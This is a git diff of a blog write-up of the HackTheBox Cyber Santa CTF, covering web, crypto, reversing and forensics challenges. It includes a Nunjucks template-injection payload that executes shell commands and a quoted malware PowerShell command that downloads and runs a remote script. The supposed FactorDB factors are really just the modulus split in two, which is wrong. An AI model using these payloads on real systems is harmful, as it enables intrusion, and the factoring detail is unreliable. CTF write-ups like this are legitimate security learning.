@@ -16,7 +16,6 @@
 - [Forensics](#forensics)
   - [baby APT](#baby-apt)
   - [Honeypot](#honeypot)
-  - [Persist](#persist)
   - [Giveaway](#giveaway)
   - [Ho Ho Ho](#ho-ho-ho)
 
@@ -24,12 +23,7 @@
 
 [Cyber Santa CTF](https://ctftime.org/event/1523/) is a Jeopardy style CTF hosted by [HackTheBox](https://www.hackthebox.com/events/santa-needs-your-help). This CTF was for 5 days, each day 5 new challenges were introduced. 
 
-Categories of challenges: 
-1. Web
-2. Pwn
-3. Crypto
-4. Forensics
-5. Reversing
+Categories of challenges: Web, Crypto, PWN, Reversing and Forensics
 
 > This post will contain everything I tried for this CTF. I was able to complete only 9 out of the 25 challenges.
 
@@ -368,11 +362,8 @@ From official docs:
 > Nunjucks does not sandbox execution so it is not safe to run user-defined templates or inject user-defined content into template definitions. On the server, you can expose attack vectors for accessing sensitive data and remote code execution. On the client, you can expose cross-site scripting vulnerabilities even for precompiled templates (which can be mitigated with a strong CSP). See this issue for more information.
 
 
-When I tested the payload(below) on the `elf_name` field, couldn't find the result _49_ being reflected on the site. This was cause the templating happens on `/` whereas I was looking for the vuln in `/dashboard`.
+When I tested the payload: `\{\{'7'*7\}\}`(remove the `\`) on the `elf_name` field, couldn't find the result _49_ being reflected on the site. This was cause the templating happens on `/` whereas I was looking for the vuln in `/dashboard`.
 
-```
-{{7*'7'}}
-```
 
 <figure>
 <img src="/assets/img/htbctf/nonssti.png" alt="username admin">
@@ -381,7 +372,7 @@ When I tested the payload(below) on the `elf_name` field, couldn't find the resu
 Now that SSTI is confirmed need to look for a SSTI command that can be used for RCE. The commands from PayloadAllThings-SSTI failed.
 Found this site: [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine), the payload mentioned here worked and gave us RCE!!
 
-> **Remove the '\' at the start between '{{'. For some reason my site doesnt show the payload**
+> **Remove the '\' at the start. Jekyll doesn't like curly braces**
 
 ```
 {\{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
@@ -592,6 +583,71 @@ And we finally have `letter.pdf`. Opening it reveals the flag!!
 
 ## Missing Reindeer
 
+For this challenge we are given a single file: `message.eml`. Inside which there was one _public key_ and the _encrypted text_
+
+**Public key:**
+```
+-----BEGIN PUBLIC KEY-----
+MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKCAQEA5iOXKISx9NcivdXuW+uE
+y4R2DC7Q/6/ZPNYDD7INeTCQO9FzHcdMlUojB1MD39cbiFzWbphb91ntF6mF9+fY
+N8hXvTGhR9dNomFJKFj6X8+4kjCHjvT//P+S/CkpiTJkVK+1G7erJT/v1bNXv4Om
+OfFTIEr8Vijz4CAixpSdwjyxnS/WObbVmHrDMqAd0jtDemd3u5Z/gOUi6UHl+XIW
+Cu1Vbbc5ORmAZCKuGn3JsZmW/beykUFHLWgD3/QqcT21esB4/KSNGmhhQj3joS7Z
+z6+4MeXWm5LXGWPQIyKMJhLqM0plLEYSH1BdG1pVEiTGn8gjnP4Qk95oCV9xUxWW
+ZwIBAw==
+-----END PUBLIC KEY-----
+```
+
+**Encrypted text:**
+```
+Ci95oTkIL85VWrJLVhns1O2vyBeCd0weKp9o3dSY7hQl7CyiIB/D3HaXQ619k0+4FxkVEksPL6j3wLp8HMJAPxeA321RZexR9qwswQv2S6xQ3QFJi6sgvxkN0YnXtLKRYHQ3te1Nzo53gDnbvuR6zWV8fdlOcBoHtKXlVlsqODku2GvkTQ/06x8zOAWgQCKj78V2mkPiSSXf2/qfDp+FEalbOJlILsZMe3NdgjvohpJHN3O5hLfBPdod2v6iSeNxl7eVcpNtwjkhjzUx35SScJDzKuvAv+6DupMrVSLUfcWyvYUyd/l4v01w+8wvPH9l
+```
+
+From the given public key the values of `n` and `e` can be extracted using the python script below or using **RSACtfTool**:
+
+```python
+from Crypto.PublicKey import RSA
+
+f = open('public.pem','r')
+key = RSA.importKey(f.read())
+print(key.n)
+print(key.e)
+```
+
+```
+n = 29052360453120059177701146498207729611014362120841772147885284668310294675407700581246333337318872050600353022438909391852076208405990507154764842795064455368228014381969783955360165426546947312973195061115837228105648770122442650123819968683831588775039837617788817831554836487051931001049480790287468125246758818911220414888048673899462271009956700067150701189256017793349102117503912782889345559816174845605183913828898737756645848010661322897081850561427949550036638510279173557403134806365178654334553002357480355906235714208451535185647256346503450896572487047615057007598805977277186223884121839444217172432487
+
+e = 3
+```
+
+Values of `a` and `b` can also be found from value of `n` using **FactorDB**:
+
+```
+290523604531200591777011464982077296110143621208417721478852846683102946754077005812463333373188720506003530224389093918520762084059905071547648427950644553682280143819697839553601654265469473129731950611158372281056487701224426501238199686838315887750398376177888178315548364870519310010494807902874681252467588189112204148880486738994622710099567000671507011892560177933491021175039127828893455598161748456051839138288987377566458480106613228970818505614279495500366385102791735574031348063651786543345530023574803559062357142084515351856472563465034508965724870476150570075988059772771862238841218
+
+39444217172432487
+```
+
+This is a text book example of **RSA - Weak Exponent Attack**. More info about this attack: [RSA weak exponent attack](https://cims.nyu.edu/~regev/teaching/lattices_fall_2004/ln/rsa.pdf).
+
+Solve:
+
+```python
+>>> import libnum
+>>> c = libnum.s2n(open("enc","rb").read())
+>>> c
+3778608670452741690585532070582737668282151949640402971008788675797867361769689843795603772570139166588578774047027062261466175271392436524653959718229204843915061726484932376601163405265201763831847338823471193932707736077364458453053284027613438860180982451957373644892420683829816445662870127785631688212264667656902285465215893696422157358833968897797828703078065238512429996646780856030831270941538206089269140998459840179372535825110571621961016595399813535271853291603009139930478398009395635275428350832860405110482112603276542371203486280518726687143561313790881202021
+>>> import gmpy2
+>>> gmpy2.iroot(c,3)
+(mpz(1557557083543814172336607163260092833421057646019104960727073356364066073441281899179702244042726263049650591998409092023301232930288444853604698625348475061214874927442198998278165154227631741), True)
+>>> m = libnum.n2s(1557557083543814172336607163260092833421057646019104960727073356364066073441281899179702244042726263049650591998409092023301232930288444853604698625348475061214874927442198998278165154227631741)
+>>> m
+b'We are in Antarctica, near the independence mountains.\nHTB{w34k_3xp0n3n7_ffc896}'
+>>>
+```
+
+**FLAG: HTB{w34k_3xp0n3n7_ffc896}**
+
 ---
 
 # Reversing
@@ -599,26 +655,183 @@ And we finally have `letter.pdf`. Opening it reveals the flag!!
 
 ## Infiltration
 
+> I was not able to solve this challenge... Don't know how I missed this 😥
+
+Only a `client` file was downloadable and there was a docker instance we needed to spin up. Using the given `client` script to connect to the docker server:
+
+```bash
+./rev_infiltration/client 178.62.5.61 31485
+[!] Untrusted Client Location - Enabling Opaque Mode
+```
+
+Googling what "Opaque Mode" meant was a huge rabbit hole... Wasted a lot of time on this particular wild goose hunt.
+
+**Solve:** Running `strace` while executing shows that `puts` is being called and it prints the flag.
+
+<figure>
+<img src="/assets/img/htbctf/infiltration.png" alt="REV:Infiltration - flag">
+</figure>
+
+**FLAG: HTB{n0t_qu1t3_s0_0p4qu3}**
+
+
 ---
 
 # Forensics
 
----
-
 ## baby APT
+
+This was a really simple challenge. A PCAP file: `christmaswishlist.pcap` was provided. Using _Protocol hierarchy_ we see that some of the captured packets include **Line based text data**, which is really interesting:
+
+<figure>
+<img src="/assets/img/htbctf/babyproto.png" alt="Protocol hierarchy">
+</figure>
+
+Filtering only the line text data using the filter: `data-text-lines` we get 8 packets:
+
+<figure>
+<img src="/assets/img/htbctf/baby8packets.png" alt="Line data packets">
+</figure>
+
+Looking at the packets they seem like the page source code for some site. The last packet is really interesting cos it has some _base64_ text:
+
+```
+SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW5
+```
+
+Decoding that we get the flag!
+
+**FLAG: HTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}**
 
 ---
 
 ## Honeypot
 
----
+> Got pretty close to solving it but couldn't get the URL right
 
-## Persist
+**Challenge description:** 
+
+Santa really encourages people to be at his good list but sometimes he is a bit naughty himself. He is using a Windows 7 honeypot to capture any suspicious action. Since he is not a forensics expert, can you help him identify any indications of compromise?
+
+Find the full URL used to download the malware.
+Find the malicious's process ID.
+Find the attackers IP
+Flag Format: HTB{echo -n "http://url.com/path.foo_PID_127.0.0.1" | md5sum}
+
+For this challenge we were given a `honeypot.raw` file
+
+**Finding the right tool:** Based on previous reading(of writeups) **Volatility** is the tool generally used for memory forensics. But a quick google for "forensics tools" will lead you to it.
+
+**Enumerating the .raw file**:
+
+```bash
+vol.py -f honeypot.raw imageinfo
+Volatility Foundation Volatility Framework 2.6.1
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
+                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
+                     AS Layer2 : FileAddressSpace (/home/kali/htb/challenges/for_honeypot/honeypot.raw)
+                      PAE type : PAE
+                           DTB : 0x185000L
+                          KDBG : 0x82930c68L
+          Number of Processors : 1
+     Image Type (Service Pack) : 1
+                KPCR for CPU 0 : 0x82931d00L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image date and time : 2021-11-25 19:14:12 UTC+0000
+     Image local date and time : 2021-11-25 11:14:12 -0800
+```
+
+Important things to note in the output: _Profile_ and _KDBG_. The next step was to find all the processes running on the system:
+
+```bash
+python2 vol.py -f ~/htb/challenges/for_honeypot/honeypot.raw --profile=Win7SP1x86 -g 0x82930c68 pslist > ~/htb/challenges/for_honeypot/pslist.op
+```
+Other plugins that can be used: `psxlist`, `pstree` 
+
+**pstree**: shows parent-child process and can output to several different formats
+
+```bash
+vol.py -f honeypot.raw --profile=Win7SP1x86 -g 0x82930c68 pstree --output=dot --output-file infected.dot
+```
+
+One set of processes stands out: 
+
+<figure>
+<img src="/assets/img/htbctf/honeypotinteresting.png" alt="Interesting process">
+</figure>
+
+The malicious process PID is `2700` - one of the required components for flag
+We can inspect the **Command line arguments used for powershell.exe** by using `cmdline`
+
+```bash
+vol.py -f honeypot.raw --profile=Win7SP1x86 -g 0x82930c68 cmdline -p 2700 
+Volatility Foundation Volatility Framework 2.6.1
+************************************************************************
+powershell.exe pid:   2700
+Command line : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden /e aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHcAaQBuAGQAbwB3AHMAbABpAHYAZQB1AHAAZABhAHQAZQByAC4AYwBvAG0ALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQApAA==
+```
+
+Decoding the base64 text and we get the full command used
+
+```
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /window hidden /e iex ((new-object net.webclient).downloadstring('https://windowsliveupdater.com/update.ps1'))
+```
+
+Thought the _malicious URL_ was `https://windowsliveupdater.com/update.ps1` but turned out to be wrong...
+
+To get the IPs we can run `netscan` another plugin:
+
+```bash
+vol.py -f honeypot.raw --profile=Win7SP1x86 -g 0x82930c68 netscan
+```
+
+And got stuck here and was not able to complete the challenge ＞﹏＜
 
 ---
 
 ## Giveaway
 
+This was a generic Document forensics challenge involving **Macros**. We get a document file: `christmas_giveaway.docm`. Opening it up in LibreOffice tells that the document contains macros. 
+
+<figure>
+<img src="/assets/img/htbctf/giveawaymacro.png" alt="LibreOffice shows macros">
+</figure>
+
+To find out what the macros is doing: `Tools -> Macros -> Edit Macros` in LibreOffice:
+
+<figure>
+<img src="/assets/img/htbctf/giveawaymacrocode.png" alt="Macro code">
+</figure>
+
+One section of the code looks interesting: 
+
+<figure>
+<img src="/assets/img/htbctf/giveawayinteresting.png" alt="Macro code snippet">
+</figure>
+
+```vb
+HPkXUcxLcAoMHOlj = "https://elvesfactory/" & Chr(Asc("H")) & Chr(84) & Chr(Asc("B")) & "" & Chr(123) & "" & Chr(84) & Chr(Asc("h")) & "1" & Chr(125 - 10) & Chr(Asc("_")) & "1s" & Chr(95) & "4"
+cxPZSGdIQDAdRVpziKf = "_" & Replace("present", "e", "3") & Chr(85 + 10)
+fqtSMHFlkYeyLfs = Replace("everybody", "e", "3")
+fqtSMHFlkYeyLfs = Replace(fqtSMHFlkYeyLfs, "o", "0") & "_"
+ehPsgfAcWaYrJm = Chr(Asc("w")) & "4" & Chr(110) & "t" & Chr(115) & "_" & Chr(Asc("f")) & "0" & Chr(121 - 7) & Chr(95)
+FVpHoEqBKnhPO = Replace("christmas", "i", "1")
+FVpHoEqBKnhPO = Replace(FVpHoEqBKnhPO, "a", "4") & Chr(119 + 6)
+```
+
+Converting the given code into python:
+
+```python
+>>> chr(ord('H')) + chr(84) + chr(ord('B')) + chr(123) + chr(84) + 'h' + '1' + chr(125-10) + '_' + '1s' + chr(95) + '4' + '_' + 'present'.replace('e', '3')
++ chr(85+10) + ('everybody'.replace('e', '3')).replace('o', '0') + '_' + 'w' + '4' + chr(110) + 't' + chr(115) + '_' + 'f' + '0' + chr(121-7) + chr(95) + ('christmas'.replace('i', '1')).replace('a', '4') + chr(119+6)
+'HTB{Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s}'
+```
+
+**FLAG: HTB{Th1s_1s_4_pr3s3nt_3v3ryb0dy_w4nts_f0r_chr1stm4s}**
+
 ---
 
 ## Ho Ho Ho
+
+---
